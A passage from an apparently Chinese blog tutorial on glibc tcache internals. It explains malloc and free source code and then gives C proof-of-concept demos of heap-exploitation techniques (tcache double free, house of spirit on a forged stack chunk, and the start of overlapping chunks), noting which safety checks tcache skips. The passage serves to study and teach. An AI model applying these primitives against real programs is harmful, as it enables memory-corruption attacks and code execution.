class="comment">// 把该 fastbin 里面其他的 bin 放到 tcache 里面</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">// 判断 tcache 中指定 bin 中 chunk 是否超过 7</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>在 相应 <code>fastbin</code> 找到 合适的 <code>chunk</code> 后，就把 该 <code>chunk</code> 从 <code>fastbin</code> 里面拿下来</li><li>然后 把相应 <code>fastbin</code> 里面剩下的 <code>chunk</code> 全都放到 <code>tcache</code> 里面 ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满了 (已经有 <code>7</code> 个 <code>chunk</code> 了，即 <code>tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7</code> ）。</li><li>最后在返回一开始拿到的 <code>chunk</code> 给用户</li></ul><p>如果 <code>fastbin</code> 不能分配，则进入 <code>smallbin</code> 的分配流程</p><h4 id="处理-smallbin"><a href="#处理-smallbin" class="headerlink" title="处理 smallbin"></a>处理 smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = bin;  <span class="comment">// 找到 chunk ， 从 smallbin拿下来准备返回给用户</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>和 <code>fastbin</code> 是类似的操作， 在 <code>size</code> 对应的 <code>smallbin</code> 里面找到 <code>chunk</code> 后</p><p>把这个 <code>chunk</code> 从链表上取下来</p><p>然后把该 <code>smallbin</code> 里面剩下的 <code>bin</code> 放入到 <code>tcache</code> ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满.</p><p>如果 <code>smallbin</code> 也没能分配，进入 <code>unsorted bin</code></p><h4 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          <span class="comment">// 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">     <span class="comment">// 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历</span></span><br><span class="line"> We may <span class="keyword">return</span> one of these chunks later.  */</span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。</span></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">//如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 </span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         &#125; <span class="comment">// end of  while ((victim = unsorted_chunks (av)-&gt;b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>在遍历 <code>unsorted bin</code> 的时候， 如果找到大小刚好满足的 <code>bin</code> ， 不会立刻返回，而是把这个 <code>bin</code> 放入 <code>tcache</code> 里面，并且设置 <code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code></li><li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面</li><li>遍历 <code>unsorted bin</code> 的最后，会根据 <code>return_cached</code> 判断是否有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code> ， <code>mp_.tcache_unsorted_limit</code> 默认为 <code>0</code> ，所以不会进入分支， 这样就会把所有的 <code>unsorted bin</code> 都放入到 <code>tcache</code>。</li><li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了</li><li>否则 <code>large bin</code> ，<code>top chunk</code> 来分配</li></ul><h2 id="tcache-in-free"><a href="#tcache-in-free" class="headerlink" title="tcache in free"></a>tcache in free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>删掉了一些没影响的代码</p><ul><li>首先就是获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就看 <code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li><li>否则就和没有 <code>tcache</code> 是一样的处理</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk( next )</code> 的 <code>PREV_INUSE</code> 位，但是如果 <code>chunk</code> 被放入了 tcache ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">// 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);  <span class="comment">// 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>同时在 <code>malloc</code> 的时候 ，先尝试 <code>tcache</code> 分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这也使得很多安全检测不会被执行。</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>通过 <code>free</code> 2次同一个 <code>chunk</code> ， 使得可以让两个指针分配到同一块内存</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Next allocated memory will be same: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过 <code>_int_free</code> 的源码我们知道， 在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk</code> ( <code>next</code> ) 的 <code>PREV_INUSE</code> 位</li><li>然后如果 <code>tcache</code> 指定项没有满就把 <code>chunk</code> 加入 <code>tcache</code></li><li>但是如果 <code>chunk</code> 被放入了 <code>tcache</code> ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></li></ul><p>所以我们释放两次 <code>p1</code> , 此时 <code>tcache</code> 里面 <code>size</code> 为 <code>0x50</code> ( <code>chunk</code> 大小) 的项中就有 两个 一样 <code>chunk</code></p><p>然后分配两次一样大小的 <code>chunk</code>， <code>malloc</code> 会先用 <code>tcache</code> 分配，就会拿到两个一样的 <code>chunk</code></p><p>可以看到分配到了两个地址一样的 <code>chunk</code> .</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>通过伪造 <code>size</code> ，然后 <code>free</code> 掉这个 伪造的 <code>chunk</code> , 然后再分配 <code>size</code> 大小的 <code>chunk</code> , 就可以分配到指定位置。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>首先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack buf: %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* fake_chunk = (<span class="keyword">char</span> * )fake_chunk_and_more;</span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="number">0x110</span> + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x40</span>;  <span class="comment">// 设置 pre_inused 位</span></span><br><span class="line">    <span class="keyword">char</span> *mem = fake_chunk + <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100) returned: %p\n"</span>, mem2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在栈上面（用栈只是为了方便）伪造了 一个 <code>0x110</code> 大小 <code>chunk</code>，</p><p>然后把它释放掉，他就会进入 <code>tcache</code> ,然后分配 <code>0x110</code> 的 <code>chunk</code> 就可以 分配到 <code>fake_chunk_and_more</code> 的地址</p><p>可以看到分配到了<code>fake_chunk_and_more</code> .</p><p>调试过程的内存状态</p><p>熟悉 <code>malloc</code> 管理机制的老哥们可以比较奇怪，这里把 <code>next_chunk-&gt;pre_inused = 0</code> ( <code>size = 0x40</code> ) 。</p><p>在 源码里面是有通过 <code>check_inuse_chunk</code> 检测是否 <code>double free</code> 的 代码的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  ....................................................</span><br><span class="line">  ....................................................</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是从 <code>ida</code> 里面去看，居然不见了，校验 <code>chunk</code> 的 <code>size</code> 和 指针 后就直接进入 <code>tcache</code> 的处理的流程， 于是这里就算设置 下一个<code>chunk</code> 的 <code>next_chunk-&gt;pre_inuse = 0</code> ,也不会出现 <code>crash</code> 。</p><h2 id="overlapping-chunks-by-caching"><a href="#overlapping-chunks-by-caching" class="headerlink" title="overlapping_chunks_by_caching"></a>overlapping_chunks_by_caching</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><code>overlapping_chunks</code> 这种技术非常经典了， 不过在 <code>tcache</code> 里面就非常的简单了， 修改 <code>chunk</code> 的 <code>size</code> 为 <code>fake_size</code> ， 然后 <code>free</code> 掉它，就会进入 <code>fake_size</code> 对应的 <code>tcache</code> ， 然后在 分配 <code>fake_size</code> 的 <code>chunk</code> 就可以拿到这个 <code>chunk</code> , <strong>overlap chunk</strong></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *sentry = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sentry, <span class="string">'b'</span>, <span class="number">0x10</span>);</span><br><span class="line">    